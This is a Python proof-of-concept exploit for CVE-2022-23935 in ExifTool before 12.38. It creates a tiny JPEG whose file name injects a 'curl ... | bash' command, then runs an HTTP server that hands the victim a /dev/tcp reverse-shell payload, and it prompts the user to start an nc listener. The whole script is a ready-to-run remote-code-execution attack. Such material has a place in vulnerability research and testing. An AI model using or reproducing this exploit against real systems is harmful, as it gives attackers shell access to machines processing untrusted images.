import argparse
import rich
import socketserver
import sys
from functools import partial
from http.server import SimpleHTTPRequestHandler

ASCII_ART = """

░█████╗░██╗░░░██╗███████╗░░░░░░██████╗░░█████╗░██████╗░██████╗░░░░░░░██████╗░██████╗░░█████╗░██████╗░███████╗
██╔══██╗██║░░░██║██╔════╝░░░░░░╚════██╗██╔══██╗╚════██╗╚════██╗░░░░░░╚════██╗╚════██╗██╔══██╗╚════██╗██╔════╝
██║░░╚═╝╚██╗░██╔╝█████╗░░█████╗░░███╔═╝██║░░██║░░███╔═╝░░███╔═╝█████╗░░███╔═╝░█████╔╝╚██████║░█████╔╝██████╗░
██║░░██╗░╚████╔╝░██╔══╝░░╚════╝██╔══╝░░██║░░██║██╔══╝░░██╔══╝░░╚════╝██╔══╝░░░╚═══██╗░╚═══██║░╚═══██╗╚════██╗
╚█████╔╝░░╚██╔╝░░███████╗░░░░░░███████╗╚█████╔╝███████╗███████╗░░░░░░███████╗██████╔╝░█████╔╝██████╔╝██████╔╝
░╚════╝░░░░╚═╝░░░╚══════╝░░░░░░╚══════╝░╚════╝░╚══════╝╚══════╝░░░░░░╚══════╝╚═════╝░░╚════╝░╚═════╝░╚═════╝░
PoC for [bold yellow]CVE-2022-23935[/bold yellow] - ExifTool Version < [bold yellow]12.38[/bold yellow]
"""

# Smallest Possible valid JPEG
# https://gist.github.com/scotthaleen/32f76a413e0dfd4b4d79c2a534d49c0b
JPEG_BYTES = b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xFF\xDB\x00" \
             b"\x43\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
             b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
             b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xC2\x00" \
             b"\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00" \
             b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x01\x00\x01\x3F\x10"

FILENAME_FMT = "curl {ip}:{port} | {shell} |"
REVERSE_SHELL_FMT = "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5"

# ---------------------------------------------------------------------------------------------------------------------
class WebHandler(SimpleHTTPRequestHandler):
    # -----------------------------------------------------------------------------------------------------------------
    def __init__(self, payload: str, *args, **kwargs):
        self.payload = payload
        super().__init__(*args, **kwargs)
    # -----------------------------------------------------------------------------------------------------------------
    def do_GET(self):
        success("Got Request. Sent Payload 🏴‍☠️")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(self.payload.encode())
        sys.exit(0)
    
    # -----------------------------------------------------------------------------------------------------------------
    def log_message(self, format, *args):
        pass

# ---------------------------------------------------------------------------------------------------------------------
def error(txt: str):
    rich.print(f"[red][-] Error: [/red]{txt}")
    sys.exit(1)

# ---------------------------------------------------------------------------------------------------------------------
def status(txt: str, prefix=""):
    rich.print(prefix + f"[blue][*][/blue] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def success(txt: str, prefix=""):
    rich.print(prefix + f"[green][+][/green] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def cli():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="IP Address/Host for Callback")
    parser.add_argument('port', help="Port Number for Callback")
    parser.add_argument('-l', '--listen', dest="server_port", help="Port Number for Server Listen", default=55555)
    parser.add_argument('-s', '--shell', default="bash", help="Remote Shell")
    args = parser.parse_args()
    rich.print(ASCII_ART)
    
    filename = FILENAME_FMT.format(shell=args.shell, ip=args.ip, port=args.server_port)
    payload = REVERSE_SHELL_FMT.format(shell=args.shell, ip=args.ip, port=args.port)

    status(f"Creating File: \"{filename}\"")

    with open(filename, "wb") as fd:
        fd.write(JPEG_BYTES)
    
    success("DONE.")
    status(f"Use Listener:  [bold cyan]nc -nvlp {args.port} [/bold cyan]")

    try:
        handler = partial(WebHandler, payload)
        with socketserver.TCPServer(("", args.server_port), handler) as httpd:    
            status(f"Server Started on {args.server_port} (Ctrl+C to stop)\n")
            httpd.serve_forever()
    except KeyboardInterrupt:
        status("Quitting...")
        sys.exit(0)
    except Exception as e:
        error(f"Exception: {e}")
